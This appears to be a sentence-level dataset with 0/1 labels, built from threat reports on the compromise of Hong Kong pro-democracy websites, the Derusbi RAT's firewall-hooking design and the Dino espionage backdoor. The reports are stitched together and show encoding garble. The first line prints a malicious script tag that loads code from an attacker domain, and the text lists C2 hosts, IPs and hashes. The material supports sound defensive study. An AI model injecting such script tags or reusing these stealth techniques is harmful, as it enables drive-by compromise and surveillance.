< script language = javascript src = http://java - se.com / o.js</script > The domain name java-se.com is known bad and associated with APT activity .	0
At the time of this post , the domain is hosted on the Japanese IP address 210.253.101.105 .	0
7506 | 210.253.96.0/20 | INTERQ | JP | GMO.JP | GMO INTERNET INC .	0
Volexity has yet to actually see the contents of the file o.js , as the websites has continuously returned HTTP 403 responses each time it was requested .	0
The file was requested from IP addresses throughout Asia without ever returning valid content .	0
It € ™s unclear if this code is activated at certain times or if there is a whitelist of IPs restricting access to the file to specific targets .	0
This same code has also been observed being served from another Hong Kong website described in the next section .	0
While examining the ATD website , Volexity also observed that the site had a password protected backdoor webshell placed on it .	1
This is a fairly popular webshell that Volexity has encountered on several occasions when dealing with website compromises .	0
Volexity refers to this shell as the Angel Webshell , named after its default password of € œangel € ​.	0
The shell will simply display the text € œPassword : € ​ , a text input box , and a Login button .	0
A screen shot of the webshell as observed on the ATD website can be seen below .	0
Despite the shell being written in PHP and only displaying a simple Login prompt , it is easy to identify the Angel webshell based on unique components of its viewable HTML source code .	0
The HTML source of this page is displayed in the following image .	0
While Volexity operates under the assumption attackers have placed webshells on webservers they have compromised , in this particular instance it can be seen with certainty .	0
Attackers will often upload new webshells or add simple China Chopper style modifications to legitimate existing files in an attempt to maintain persistence to these systems .	1
In the last week , Volexity also observed both the English and Chinese language websites for the Democratic Party Hong Kong compromised with the same malicious code found ont he ATD website ( www.dphk.org | eng.dphk.org ) .	0
DPHK is a pro - democracy political party in Hong Kong .	0
Like the ATD website , at the time of this writing the DPHK websites are also serving up malicious code , so please browse with caution .	1
During our research for this post , we also became aware of multiple public reports related to the compromise of the DPHK website on both Twitter and via ThreatConnect .	0
Our good friend Claudio Giurianeri posted the following tweet on October 3 , 2014 The website of the Democratic Party of Hong Kong has been compromised and still is .	0
Let them know .	0
# OccupyCentral Diving further into some of the replies to this tweet is a plethora of information regarding the exploit domain java-se.com .	0
In particular , a tweet from Brandon Dixon with relevant data from the PassiveTotal project details several subdomains and IP addresses associated with java-se.com .	0
While Volexity has only observed a handful of the hostnames in the wild thus far , other active subdomains suggest there could be additional on - going exploit or malware activity from the domain .	0
Additional reporting on this activity and another going back to August 2014 was also recently shared on ThreatConnect .	0
Despite all of this attention , the DPHK website is still compromised and references the JavaScript from the hostile domain .	0
It is also worth noting that this is not the first time that the DPHK website has been used in a strategic web compromise .	1
Back in May 2011 , Kaspersky Lab reported the website was being leveraged to target users with Flash Exploits .	1
The DPHK appears to be of high value with respect to targeting visitors .	0
During the course of investigating activity related to the ATD and DPHK websites , Volexity also observed that the website of the political coalition and pan - democratic organization People Power in Hong Kong ( www.peoplepower.hk ) had been compromised as well .	1
However , unlike the other two websites , the People Power website did not contain JavaScript modifications pointing to java- se.com .	0
Instead the website appears to have malicious iFrames leveraging the Chinese URL shortener 985.so .	0
At the bottom of several of the pages for the People Power website are four iFrames as seen in this screen shot of the website source .	0
Those links , with the exception of the first one , all redirect to exploit pages on the Hong Kong IP address 58.64.178.77 .	0
These pages load scripts that conduct profiling of the system for various software , plugins , and other related information , as well as load Java exploits designed to install malware on the target system .	1
If successful , the exploits will install either a 32-bit or 64-bit version of the malware .	1
Both files are found within the Java Archives files .	0
Below are details on each of the malware files .	0
Filename : main.dll File size : 13824 bytes MD5 hash : 1befa2c2d1bfc8e87d52871c868f75fe SHA1 hash : 8f81bb0bfa6b3ebf3ef4ea283b23a5ccae5b6817 Notes : 32-bit version of malware , which beacons to 58.64.178.77:443 .	0
Filename : main64.dll File size : 15872 bytes MD5 hash : a482a84d13c76b950ce5bc7e75f4edef SHA1 hash : c0a4b9145e0066f5c1534beddc9c666ea8eb0882 Notes : 64-bit version of malware , which beacons to 58.64.178.77:443 .	0
At the time of this writing , the People Power website is still serving up malicious code .	1
Volexity recommends avoiding this website and/or browsing with caution .	0
Volexity believes a separate group of attackers is responsible for this exploit activity and that they are not affiliated with the java-se.com operations .	0
While digging deeper into pro - democratic websites in Hong Kong , Volexity also discovered peculiar code on the website of a pro- democratic and pro - universal suffrage public policy think thank The Professional Commons ( www.procommons.org.hk ) .	0
In the case of this website , there is suspicious JavaScript code that writes an iFrame pointing back to a non - existent HTML page on a hotel website in South Korea .	0
The code from the website can be seen in the screen shot below .	0
The URL in question points to .	0
hXXp://www.hotel365.co.kr / Lnk / tw / index.html This link does not work and will redirect a visitor back to the main page of the website .	0
There does not appear to be any reason for the Professional Commmons website to have a hidden iFrame link randomly placed in the middle of its HTML code .	0
It is suspected that this was a formerly active exploit URL .	0
If it is actually malicious , it is possible the code could be re - activated at any time .	0
Volexity recommend the URL and the Professional Commons website be browsed with caution .	0
In early September , the APT group behind java-se.com raised its visibility on Volexity € ™s radar following a compromise that effectively impacted many components of the Japanese Nikkei .	0
In the first week of September , a subdomain used to load JavaScript code and additional files onto other Nikkei web properties such as www.nikkei.com and asia.nikkei.com was compromised .	0
In particular a JavaScript file loaded from parts.nikkei.com was modified to reference another JavaScript file from jre76.java-se.com hosted on the Japanese IP address 211.125.81.203 .	0
7506 | 211.125.80.0/22 | INTERQ | JP | GMO.JP | GMO INTERNET INC .	0
The code has since been taken down .	0
However , in early September the JavaScript was pre - pended to the file http://parts.nikkei.com/parts/SC/s_cDS.js as seen in the screen shot below .	0
Like the JavaScript from the ATD and DPHK websites , Volexity was never actually able to obtain a live copy of this script .	0
Each request results in an HTTP 403 response from the server .	0
Volexity suspects the code was either active at select times and/or was only served to a subset of visitors .	0
The code has not been observed on the s_cDS.js file for nearly a month now .	0
While tracking this APT activity , Volexity has also come across other seemingly unrelated compromises of websites in Hong Kong and Japan associated with the java-se.com activity .	0
Despite several sites being compromised , the above activity tied to java-se.com did not result in the successful capture of actual exploit code or malware .	0
However , research into other websites and activity involving java-se.com did lead Volexity to live exploits and malware .	0
In particular Volexity came across live exploit code hosted at jdk-7u12-windows-i586.java-se.com on the Japanese IP address 210.253.96.200 .	0
7506 | 210.253.96.0/20 | INTERQ | JP | GMO.JP | GMO INTERNET INC .	0
This system hosted a JavaScript file , which in turned loads a malicious Java Applet .	1
In testing the the Java Applet pops up a notification to the user asking them if they want to run the applet .	0
Volexity has not had enough time to thoroughly analyze the file to see if it is an actual exploit or if the attackers rely on user assisted malware installation .	0
The pop - up does make it appear as if the file is an update to Java .	0
The popup displayed by Java is displayed below .	0
As can be seen in the image above , this popup could be misconstrued by a user as an update to Java despite the java-se.com domain and the Publisher being listed as WindySoft .	0
Interestingly the Java Archive being loaded is digitally signed by a certificate issued to WindySoft , an online gaming company from South Korea .	0
We can not confirm this certificate actually belonged to WindySoft at any point in time , however , there is fairly established precedent of certificates from online gaming companies being used to digitally sign malware and attack tools .	0
As one might expect , choosing to press the Run button would be bad news for someone presented with this prompt .	0
If one were to click Run from this prompt , it would result in the file css.jpg being download over an encrypted channel from a folder on https://elsa-jp.jp .	0
Note that elsa-jp.jp is a website hosted on the same IP address jdk-7u12-windows-i586.java-se.com and is likely compromised .	0
The file css.jpg is of course not a JPEG file , it is an executable that has been encoded with the single - byte XOR key 0xFF .	0
Filename : css.jpg File size : 168776 bytes MD5 hash : b3a9e6548fb3cc511096af4d68b2e745 SHA1 hash : 394703d1240ccd3aaeeef50c212313e3036741b1 Notes : Executable file downloaded by Java Applet that has been encoded with XOR 0 -99 Taking a closer look at the resulting executable we have , it turns out it is a newer sample of PlugX.	0
In this particular sample an interesting and notable string was observed .	0
C:\wocawocawoca\piao\Release\caca.pdb Also of interest is that as observed from the Java Applet , the executable is also digitally signed by a certificate issued to € œWindySoft .	0
€ ​ Upon execution the malware sample immediately does a DNS resolution for the following hostname .	0
jduhf873jdu7.blog.163.com The PlugX sample connects to the blog and parses the page for a command for where to connect to next .	1
This is very similar to the method described by FireEye in their blog on Operation Poisoned Hurricane .	0
The primary difference being that the attackers opted to use a 163.com Blog over a Google Code page to embed the command .	0
Taking a closer look at the Blog page the following post is observed .	0
The primary string to focus on is in the title of the post : DZKSCAAAAJPBBDHDDDOCCDFDFDOCCDBDHDOCHDHDDZJS Using the same decoding routine describe by Cassidian in a PlugX post of theirs from earlier this year , we can see this command decodes to instruct the malware to connect to a U.S .- based Linode IP address at Hurricane Electric : 173.255.217.77 .	0
6939 | 173.255.208.0/20 | HURRICANE | US | LINODE.COM | LINODE A look at passive DNS identifies several hostnames that recently resolved to the IP address .	0
The ones that still resolve to the IP are listed below .	0
These hostnames may be related but at the time of this writing we have not seen them in use in malware and are unable to confirm .	0
As we have seen for several years now , dissenting groups , especially those seeking increased levels of freedom frequently find themselves targeted for surveillance and information extraction .	0
In the digital age , a strategic web compromise ( exploit drive - by ) has become a key weapon of choice for to conduct such operations .	0
These types of attacks are far from overt , as a typical target and victim opted to go on their own to what they believe should be a safe and trusted website .	0
In the case of this post , it appears that at least two different attackers were involved in compromising and placing malicious code on Pro - Democratic websites in Hong Kong .	1
This is not the first time and surely will not be the last time that those in favor of democracy in Hong Kong will be targeted .	0
Unfortunately with the level of access and infrastructure the attackers appear to have , this is quite an uphill battle .	0
Continuing to expose these attack is one means that shines light on these attack operations with an aim at putting a dent in their success .	0
There are two types of Derusbi malware : a client - server model and a server - client model .	0
Both types provide basic RAT functionality with the distinction between the two being largely the directionality of the communication .	0
This report will focus on the server - client variant ( or simply , the " server variant " ) of Derusbi , which acts as a server on a victim 's machine and waits for commands from a controlling client .	1
In and of itself , the Derusbi server variant is a largely unremarkable RAT when viewed from the perspective of functional capabilities .	0
The server variant supports basic RAT functionality such as file management ( uploading and downloading ) , network tunneling and remote command shell .	0
What makes the server variant interesting is the device driver that the variant installs .	1
The server variant utilizes a device driver in order to hook into the Windows firewall by either using largely undocumented Windows Firewall hooking techniques found in Windows XP and older or by using the documented Windows Filtering Platform found in Windows Vista and later .	1
The driver , after hooking the firewall using either of the two mentioned interfaces , will inspect incoming network packets .	1
If a specific handshake occurs between the client and the server variant , the remainder of the communication session for the established session will be redirected to the server variant .	0
If the driver does not detect the appropriate handshake , then the network traffic is allowed to pass unobstructed .	0
This allows an attacker to hide their communication within a cluster of network sessions originating from a single IP such as would be the case for a client performing multiple HTTP requests against a web server .	1
The server variant runs as a svchost dependent service .	0
While the server variant binary does have exports related to the standard service DLL ( e.g.	0
ServiceMain , DllRegisterService , etc . ) , the startup sequence truly begins in the DllEntryPoint function .	0
When loaded into memory via a LoadLibrary or equivalent function call , the server variant will determine the name of the host binary ( presumably svchost.exe ) as well as its own DLL 's name .	1
The binary then spawns a new thread that contains the main server variant code in order to allow the DllEntryPoint routine to return to the calling function .	1
Within the main server variant function ( dubbed mainThread ) , the server variant loads a pointer to the API function GetCommandLineW , locates the pointer in memory to the command line string , and then locates the first space within the command line string and terminates the string by placing a NULL character at the location .	0
The server variant then attempts to determine if it has suitable access rights within the system in order to operation .	1
The check for access rights effectively checks to see if the server variant process is running under the NT Authority .	1
If the check is unsuccessful , then the server variant terminates .	0
With the command line patched and authority verified , the server variant sleeps for 5 seconds before verifying that the fShutdown flag is not set .	0
The fShutdown flag can become set by the process loading the server variant calling the DllRegisterServer export .	0
The DllRegisterServer function , among other tasks , will attempt to install the server variant as a server on the victim 's machine .	1
Therefore , by waiting 5 seconds before continuing the mainThread functionality , the server variant is giving the DllRegisterServer time to activate and perform the necessary operations to ensure that the server variant is properly installed and activated as a service .	0
The mainThread calls the mainLoop function of the server variant .	0
The mainLoop function begins by loading the unique infection ID for the victim 's machine from the registry ( under the key value located at HKLM\SOFTWARE\Microsoft\Rpc\Security ) .	1
The infection ID , if present , must be decoded by XOR'ing each byte of the string with a static byte value ( typically 0x5F ) .	0
If the infection ID does not exist within the registry , the server variant will attempt to load the configuration from an encoded buffer located immediately after the static string XXXXXXXXXXXXXXX , decode the buffer by starting at the last byte and XORing each previous byte by the current byte value in reverse order ; the server variant will then use a specific portion of the configuration blob as the infection ID 's base .	0
Next , the server variant will append a hyphen and a four digit value to the end of the infection ID to generate the unique infection ID for the victim 's machine .	0
The newly generated infection ID is then saved to the registry location stated previously .	0
The mainLoop attempts to get the privileges for SeDebugPrivilege , SeLoadDriverPrivilege , SeShutdownPrivilege , and SeTcbPrivilege in order to perform the necessary operations to load the driver portion of the server variant .	1
The mainLoop will attempt to open a handle to the driver ( if it is already installed ) by calling CreateFile with the filename of \Device\{93144EB0 - 8E3E-4591-B307 - 8EEBFE7DB28F}.	0
Failing this , the mainLoop determines if the victim 's machine is running the 360 antivirus product by looking for a process with the name ZhuDongFangYu.exe .	0
If the process is running , the driver is not installed but the mainLoop continues regardless .	0
If the process is not found , however , the mainLoop will extract the driver binary from an encoded buffer within itself , decode the file in memory ( using a rotating 4-byte XOR key ) , and install the driver on the victim 's machine as % SYSDIR%\Drivers\{93144EB0 - 8E3E-4591-B307 - 8EEBFE7DB28F}.sys .	0
With the driver present ( or recently installed ) , the mainLoop spawns another thread ( dubbed DerusbiThread::DerusbiThread ) that acts as the primary communication loop .	0
DerusbiThread::DerusbiThread begins by generating a PCC_SOCK object .	0
PCC_SOCK is an abstraction for the communication subsystem .	0
The prototype for PCC_SOCK appears in Figure 1 .	0
With a new PCC_SOCK object allocates , DerusbiThread::DerusbiThread selects a port between 40,000 and 45,000 to use as a listening port .	1
The port number is sent to the driver ( via IOCTL 0x220200 ) in order to inform the driver where to redirect incoming traffic .	0
The " Windows Device Driver ( Firewall Hook ) " section explains the functionality of the driver in greater detail .	0
DerusbiThread::DerusbiThread binds to the specified port and opens the port as a listener .	1
At this point DerusbiThread::DerusbiThread enters an infinite loop of waiting for new connections to the listening socket and dispatching a new thread ( dubbed CommLoop ) to handle the traffic for the socket until fShutdown is set .	0
At this point , the startup sequence for Derusbi is complete and the server variant moves into a communication and command dispatch phase .	0
The communication between the controlling client and the Derusbi server variant depends on the device driver being in place .	0
The authors of the device driver designed the driver to work on Windows 2000 and later versions of the Windows operating system .	0
Depending on the version of the victim 's OS , the driver will hook the Windows Firewall by either using the surprisingly undocumented IOCTL_IP_SET_FIREWALL_HOOK command of the \\Device\IP device for Windows XP or older machines or by using the documented Windows Filtering Platform ( WFP ) found in Windows Vista and later .	0
The device driver inspects incoming network traffic from any client connecting to the victim machine , determines if an appropriate handshake packet occurs at the beginning of a new TCP session , and then makes the decision to reroute the network traffic to the Derusbi malware or let the traffic continue unaltered to its original service .	1
Once a session has been established by means of a valid handshake , any subsequent packets from the client for the given TCP session will automatically be directed by the device driver to the Derusbi server variant .	0
The device driver does not capture or store any network traffic outside of the initial handshake inspection .	0
The Derusbi server variant will select an available , random port between the range of 40,000 and 45,000 on the victim 's machine upon which to listen .	1
After selecting the port , the server variant will wait for incoming connections and instruct the driver to redirect appropriate TCP sessions to the listening port .	1
In order to establish a valid communication channel between the server variant and a controlling client , a specific handshake is required .	0
The handshake between a client and the server variant is well defined and consisting of 64 bytes , the data within the handshake is entirely random with the exception of the 3rd and 8th DWORD .	0
The handshake begins when the client sends a 64 byte random buffer with the 3rd ( offset 12 ) and 8th ( offset 32 ) DWORDs defined as .	0
The server will acknowledge the handshake by sending a 64 byte random buffer with the same pattern for the 3rd and 8th DWORDs based on the new , randomly generated 1st DWORD ( offset 0 ) .	0
It is the client 's handshake that the driver for the server variant triggers off of .	0
Some older versions of the server variant use a different set of DWORDs to validate the handshake , also the tests are the same .	0
These other versions have been observed to use the following DWORDs .	0
If the handshake fails , the server variant provides a secondary means to authenticate a client .	0
Presumably a failsafe if the driver is unable to load , the secondary method requires the client to send a POST request with the following form .	0
In addition , the POST request must contain a Via field .	0
If the request and the Via field exist , the server variant authenticates the client and responds with If the client 's request does not meet the appropriate authentication criteria , the server variant sends .	0
With a communication channel between the server variant and the client established , the server sends information about the victim 's computer .	0
Consisting of a 180 byte data structure ( Figure 3 ) , the server variant provides the client with a variety of details about the victim 's machine .	0
The VictimInfoPacket has an identifier of 2 ( see the dwPktType explanation below ) .	0
The communication between the server and the client at this point , and for the remainder of the session , is encrypted .	0
Communication between the client and the server variant exists in the form of a sequence of encrypted datagrams .	0
Each datagram consists of a 24 byte header followed by an optional payload section .	0
The header is not encrypted but if the optional payload is attached , the payload is encrypted using a DWORD XOR .	0
The format of the header is as follows .	0
The dwTotalPacketSize field defines the total size of the datagram including both the size of the header and the size of the optional payload .	0
The dwPktType field correlates to the module ID which allows the server variant to route the datagram to the appropriate module without further inspection of the payload data .	0
The dwChecksum value is sum of all of the bytes within the optional header ( the field is ignored , but present , if there is no payload section ) .	0
The dwEncryptionKey is the 32-bit XOR encryption key for the payload section .	0
If the fCompressedPayload field is non - zero , then the data within the payload is compressed using LZO compression ( prior to XOR encoding ) and the dwDecompressedSize field represents the final size of the payload data after decompression .	0
The payload section can have up to three different presentations depending on if compression is used .	0
The first presentation is the original payload data as generated by the client or server , the second presentation is the LZO compressed form , and the final presentation ( the presentation that exists going across the network ) is the 32-bit XOR encoded data blob .	0
Figure 4 provides a graphical representation of the presentation types of the payload section .	0
After sending the server information via the VictimInfoPacket , the server variant spins off a CommLoop thread for the connection and returns to waiting for new connections from clients to appear .	1
The CommLoop thread begins by establishing the set of internal command handlers available to the server variant .	0
With the exception of the administrative command handler ( which is built into the CommLoop ) , each of the internal commands consists of an object derived from a base object PCC_BASEMOD .	0
The server variant appears to have a modular design allowing an attacker to compile only the components that are necessary for any given operation .	0
The malware supports up to 8 different modules per sample with each module designating its own ID code .	0
Novetta has observed the following modules .	0
Given the spacing in ID numbers ( as noted in the gap between 0x82 and 0x84 in an otherwise sequential ID scheme ) , it is conceivable that additional modules exist .	0
After establishing the tools , an infinite loop ( CommLoop ) is entered in which the server variant will wait for up to 1/100 of a second for input from the network ; if such input arrives , the server routes the packet to the appropriate handler .	0
If the network input does not arrive , the CommLoop queries each of the command handlers for any packets they may have queued ( by calling each command handler 's ReadWaitingData function ) and transmits the packets the handlers have generated .	0
Additionally , if more than 60 seconds passes between network inputs from the client or network outputs from the server variant , the CommLoop will send out a beacon packet ( dwPktType = 4 ) .	0
CommLoop routes packets to the appropriate command handler object by locating the dwPacketIdentifierCode within each of the registered command handlers that matches the incoming packets dwPktType .	1
When the appropriate command handler is found , CommLoop passes the payload of portion of the packet to the command handler 's ProcessPacket function .	0
The PCC_CMD object contains the remote shell functionality of the server variant along with the ability to execute arbitrary programs .	0
Derived from the PCC_BASEMOD class , the PCC_CMD class 's operations are focused largely in the ProcessPacket and ReadWaitingData functions .	0
The PCC_CMD::ProcessPacket function works as a stub function that merely passes the packet 's payload data ( pkt ) data to PCC_CMD::ProcessPacketEx while ignoring the dwPktSize parameter .	0
The packet 's payload data is , in and of itself , another datagram with a header and optional payload section .	0
The payload of each PCC_CMD destined packet contains the following header .	0
The dwCommandType field specifies the specific PCC_CMD command that the client is requesting the server variant perform .	0
There are four commands that PCC_CMD supports .	0
For each of the commands , any output from or acknowledgement of the commands comes in the form of another packet consisting of a PacketHeader followed by a PCCCMDPacketHeader and any optional payload data .	0
The dwCommandType of the newly constructed packet matches the command 's original dwCommandType value ( e.g.	0
responses from 0x04 commands will reply with dwCommandType set to 0x04 ) .	0
PCC_CMD::ProcessPacketEx will queue the response packets in an internal buffer .	0
The PCC_CMD::ReadWaitingData member function is responsible for transmitting any of the previously queued packets from PCC_CMD::ProcessPacketEx .	0
If there are no queued packets , PCC_CMD::ReadWaitingData will perform a queue of the console output pipe for the remote shell process ( if it is active ) ; the function will also attempt to read the entirety of the waiting data , which then becomes the payload of a PacketHeader / PCCCMDPacketHeader based packet with the dwCommandType set to 0x0C.	0
If the read is unsuccessful , the function returns a PacketHeader / PCCCMDPacketHeader based packet with the dwCommandType set to 0x10 indicating an error and terminating the remote shell session .	0
The PCC_FILE object provides a large range of file system administration functions .	0
PCC_FILE is derived from the PCC_BASEMOD class meaning that the processing of commands should be contained within the PCC_FILE::ProcessPacket member function with some additional processing done in the PCC_FILE::ReadWaitingData member function .	0
This is not necessarily the case , however .	0
The PCC_FILE::ProcessPacket member function , much like PCC_CMD::ProcessPacket , is little more than a stub function that passes only a copy of the payload data ( pkt ) to PCC_FILE::ProcessPacketEx .	0
PCC_FILE::ProcessPacketEx performs no file management operations but instead adds any incoming command packets to a queue for processing by PCC_FILE::ReadWaitingData if the packet is not already within the queue ( thus avoiding duplication of commands ) .	0
The PCC_FILE::ReadWaitingData member function is a stub function that calls PCC_FILE::ProcessQueue and returns the resulting packet from the queue processing .	0
This means that file operations are surprisingly low priority , and potentially , high latency operations .	0
Each packet that arrives within the packet queue of PCC_FILE contains a standard header followed by a ( quasi - optional ) payload data blob .	0
The header for the PCC_FILE command packets takes the following form .	0
The dwCommandType field specifies the specific PCC_FILE command that the client is requesting the server variant to perform .	0
PCC_FILE supports 17 ( of which 15 are unique ) commands .	0
While the general form within the Derusbi server variant communication model is to return a packet with the same dwCommandType as the original command , many of the PCC_FILE commands return a status packet type ( dwCommandType = 0x04 ) .	0
Commands 0x2C , 0x44 , and 0x48 all appear to be the exact same base command with only slight variations in their response format .	0
It is unclear why this particular command is included three times in PCC_FILE .	0
The PCC_PROXY object provides the platform for a tunneling network traffic to and from the client to a specific endpoint ( or endpoints if multiple tunnels are activated by the client ) .	0
Derived on the PCC_BASEMOD class , the PCC_PROXY class performs very little network tunneling within the CommLoop interactive PCC_PROXY::ProcessPacket and PCC_PROXY::ReadWaitingData member functions .	0
The PCC_PROXY::ProcessPacket member function queues incoming PCC_PROXY packets into a received queue while PCC_PROXY::ReadWaitingData returns packets from a transmit queue , with the directionality from the perspective of the server variant .	0
The core of the PCC_PROXY 's network tunneling comes from a spawned processing thread ( PCC_PROXY::MainThread ) that is generated when the PCC_PROXY object is instantiated .	0
The PCC_PROXY::MainThread function consist an infinite loop that only terminates when the PCC_PROXY::fShutdown flag is set .	0
Otherwise , the loop will inspect another internal flag ( PCC_PROXY::fNetworkEnabled ) to determine if the network tunneling is currently active .	0
If the PCC_PROXY::fNetworkEnabled flag is set to false , then tunneling is disabled but command processing continues .	0
It is possible to have more than one tunnel active at any given time .	0
In order to firewall tunnels from each other over the backbone of the server variant 's command channel , each tunnel is assigned a specific channel identifier .	0
This allows the client to specify which specific tunnel data is transmitted to as well as telling the client which tunnel is returning data .	0
If the PCC_PROXY::fNetworkEnabled flag is set to true , PRC_PROXY::MainThread will loop through all active channels , perform a select on the socket connected to the endpoint and -- if the select indicates that there is data waiting on a particular socket -- the data is read .	0
A new PCC_PROXY based packet is then generated and the packet is queued for delivery to the client .	0
After processing each of the channels for new data , PCC_PROXY::MainThread processes incoming command packets from the client ( an operation usually handled by the PCC_BASEMOD::ProcessPacket function ) .	0
Packets belonging to the PCC_PROXY subsystem have a common header , much like the other PCC_BASEMOD derived classes .	0
To this end , the PCC_PROXY packets have the same packet header as the PCCFilePacketHeader packet header .	0
The PCC_PROXY supports five commands .	0
The administrative commands are built - in to the server variant and are not derived from the PCC_BASEMOD class .	0
Each of the administrative command packets contains the same header structure as the PCCFilePacketHeader structure followed by an optional payload data blob .	0
The administrative commands consist of the following five commands .	0
Given the encrypted , and potentially compressed , nature of Derusbi server variant network traffic , detecting the traffic on a network can be problematic using traditional IDS signatures .	0
Using a heuristic approach , it would be possible to detect the handshake of a possible Derusbi server variant session by looking for the following pattern .	0
Detecting Derusbi server variants on disk is possible using the following YARA signature .	0
Security news , views and insight from the ESET experts BY JOAN CALVET POSTED 30 JUN 2015 11:12AM In this blog we describe a sophisticated backdoor , called Dino by its creators .	0
We believe this malicious software has been developed by the Animal Farm espionage group , who also created the infamous Casper , Bunny and Babar malware .	0
Dino contains interesting technical features , and also a few hints that the developers are French speaking .	0
Animal Farm is the security industry 's name for a group of attackers first described by Canada 's Communications Security Establishment ( CSE ) in a set of slides leaked by Edward Snowden in March 2014 .	0
In those slides CSE assess with " moderate certainty " that this group is a French intelligence agency .	0
Since then , several examples of malware created by Animal Farm have been found and publicly documented , in particular .	0
Casper , a stealthy first stage implant , documented by ESET in last March Bunny , a Lua based backdoor , documented by Marion Marschalek ( Cyphort ) Babar , an espionage platform , also analyzed by Marion Marschalek The connection between those pieces of malware and the group described in CSE slides has been convincingly established , for example by Paul Rascagn res ( G Data ) .	0
In this blog post we add a new piece to the puzzle with Dino , another malicious program belonging to Animal Farm 's arsenal .	0
The sample of Dino documented in this blog post was used in 2013 against targets in Iran .	0
The original means of infection is unknown , though we believe Dino was installed by another program , as it contains an uninstallation command without the corresponding installation procedure .	0
Given the set of commands it can receive , Dino 's main goal seems to be the exfiltration of files from its targets .	1
The binary 's original name , " Dino.exe " , has been left visible by its authors , as was the case with Casper .	0
Dino – which could be referring to the pet character from The Flintstones cartoon show – was already mentioned in a recent Kaspersky blog as a " full featured espionage platform , " but no technical analysis has been published yet .	0
Roughly , Dino can be described as an elaborate backdoor built in a modular fashion .	1
Among its technical innovations , there is a custom file system to execute commands in a stealthy fashion , and a complex task scheduling module working in a similar way to the " cron " Unix command .	1
Interestingly , the binary contains a lot of verbose error messages , allowing us to see Dino 's developers ' choice of wording .	0
Also , a few technical artefacts suggest that Dino was authored by native French speakers .	0
Dino has been developed in C++ and presents a well defined modular architecture .	0
The following array lists the modules contained in this Dino binary; the module names are those assigned by the developers .	0
Dino heavily relies on a custom data structure named " DataStore " by the Animal Farm developers .	0
In particular , all Dino 's modules store their content inside this structure , making its understanding one of the keys to analyzing Dino .	0
A DataStore is a map from string keys to values of 8 possible types , such as integers or strings .	0
The implementation of this data structure is based on a hash table .	0
It means that to retrieve the value associated with a key , one has to calculate the hash of the key to locate a bucket from which the value can be retrieved .	0
Dino 's hash is a one byte value calculated with a series of XOR operations on the key , and each bucket starts a linked list containing key / value pairs .	0
The code responsible for retrieving the value associated with a key is shown in Figure 1 .	0
Finally , DataStore objects can be serialized in a custom format , which begins with the magic word " DxSx " .	0
This is used in particular by the PSM module to save the content of Dino modules in an encrypted file .	1
More precisely , when a modification is made to a module 's content in memory , the PSM module saves it as a serialized DataStore .	0
When Dino restarts , the module is deserialized from the file and loaded into memory .	0
Funnily enough , the key serving to encrypt the file on disk is " PsmIsANiceM0du1eWith0SugarInside " .	0
Dino 's configuration is initially stored in a serialized DataStore object contained in a zip archive at the end of the Dino binary .	0
At runtime this object is deserialized and stored inside the CORE module .	0
We can list the configuration 's content with Dino 's " conf –l CORE " command – described later – which displays on separate rows each key 's name , its associated value and the type of this value .	0
Started:5523F782 QWORD InitialWaitDone:00000001 DWORD InteractiveDelay:00000005 DWORD MaxNothingSaidCount:00000078 DWORD InstallDate : 5523F782 QWORD fields:78537844 … [REDACTED] … 66B3900 BYTES recID:11173 01 PRS WIDESTR Version:1.2 WIDESTR BD_Keys : 4D41474943424F58 … [REDACTED] … 9EB3506 BYTES CC_Keys : 4D41474943424F58 … [REDACTED] … 0000000 BYTES MaxDelay:00000E10 DWORD ComServer0:hXXp://www.azhar.bf/ … [REDACTED] … /postal.php STR ComServer1:hXXp://www.rsvniima.org/ … [REDACTED] … /din12/postal.php STR ComServer2:hXXp://www.azhar.bf/ … [REDACTED] … /postal.php STR ComServer3:hXXp://www.rsvniima.org/ … [REDACTED] … /din12/postal.php STR ComServer4:hXXp://dneprorudnoe.info// … [REDACTED] … /postal.php STR ComServer5:hXXp://dneprorudnoe.info// … [REDACTED] … /postal.php STR ComServer6:hXXp://dneprorudnoe.info// … [REDACTED] … /postal.php STR NextSendReceive:5CC33097FB72D001 BYTES CC:000064F7 72E4 3F7D C817 474D A9BDBDF7 STR DaysOfLife:00000000 DWORD GUID:12FEB4A9EEDEE411B283000C29FD2872 BYTES InitialDelay:00000000 DWORD now:5523F78E QWORD hash : A88E8181CA5CE35AE70C76145DFB820D BYTES InitialCommands:78537844 … [REDACTED] … 000000 BYTES xT0rvwz : DC188352A … [REDACTED] … 00000 BYTES tr4qa589:K/[RAFtIP?ciD?:D STR jopcft4T : a.ini WIDESTR While most of the keys have self explanatory names , we would like to focus on the following keys .	0
" recID " : Animal Farms binaries contain an ID whose decimal value appears to identify the target , " 11173 01 PRS " in this case .	0
For example Casper used an " ID " value set to " 13001 " , whereas some Babar samples used " 12075 01 " and " 11162 01 " .	0
We do not know the meaning of the " PRS " suffix added in the case of Dino .	0
" ComServer " : These keys contain the command and control ( C&C ) servers ' URLs .	1
All the URLs were down when we started our analysis .	0
Those C&Cs were compromised legitimate websites , which is standard operating procedure for Animal Farm .	0
" Version " : Dino 's code version; here set to " 1.2 " , which is confirmed by the " din12 " folder used in one of the C&C URLs .	0
For the record , a " d13 " folder has been seen on another Animal Farm C&C ( see " 3.7 Calling home " of Marschalek 's Babar report ) , indicating that Dino version 1.3 has also likely been deployed at some point .	0
" BD_Keys " and " CC_Keys " contain cryptographic keys to encrypt the network communications with C&C servers .	1
Their values start with the word " MAGICBOX " .	0
The three last keys are displayed with obfuscated names ( " xT0rvwz " , " tr4qa589 " and " jopcft4 T " ) and store parameters for the custom file system we will describe later .	0
The following Table lists the commands accepted by this Dino binary with the names chosen by the developers .	0
Each of those commands can take one or more arguments .	0
One command of particular interest is " search " , which allows the operators to look for files very precisely .	1
For example , it can provide all files with a " .doc " extension , the size of which is bigger than 10 kilobytes , and that were modified in the last 3 days .	0
We believe this exfiltration of files to be Dino 's end goal .	0
At startup Dino executes successively the commands stored in the " InitialCommands " field in its configuration; in the sample we analyzed they are .	0
Those commands serve as a reconnaissance step for the operators .	0
Their execution is managed by the CMDEXEC module , the commands being stored in a queue inside the CMDEXECQ module .	0
The result is reported to the C&C server .	1
After having described Dino 's basics , we are now going to dig into two particularly interesting components; first , a custom file system used by the malware , and then the CRONTAB module in charge of task scheduling .	0
Dino contains a custom file system named " ramFS " by its developers .	1
It provides a complex data structure to store files in memory , each of them bearing a name corresponding to filenames used by usual file systems .	1
RamFS also comes with a set of custom commands that can be stored in files and executed .	0
It should be noticed that ramFS is also present in other Animal Farm binaries ( see attribution paragraph below ) , but since we are unaware of previous analysis of ramFS , we are describing our findings here .	0
